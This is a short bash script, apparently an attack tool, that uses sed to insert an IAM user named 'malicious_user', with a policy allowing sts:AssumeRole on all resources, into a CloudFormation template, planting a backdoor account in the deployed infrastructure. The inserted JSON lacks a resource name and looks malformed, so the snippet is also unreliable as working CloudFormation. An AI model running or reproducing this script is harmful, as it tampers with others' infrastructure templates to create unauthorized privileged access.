#!/bin/bash
# Inject malicious code into CloudFormation template
# Usage: cloudformation_injection.sh <template_file>

TEMPLATE_FILE=$1

if [ -z "$TEMPLATE_FILE" ]; then
    echo "Usage: $0 <template_file>"
    exit 1
fi

echo "Injecting malicious code into CloudFormation template: $TEMPLATE_FILE"

sed -i '/Resources/a \ \ \ \ "Type": "AWS::IAM::User", "Properties": { "UserName": "malicious_user", "Policies": [ { "PolicyName": "malicious_policy", "PolicyDocument": { "Version": "2012-10-17", "Statement": [ { "Effect": "Allow", "Action": "sts:AssumeRole", "Resource": "*" } ] } } ] }' $TEMPLATE_FILE

echo "Injection completed."
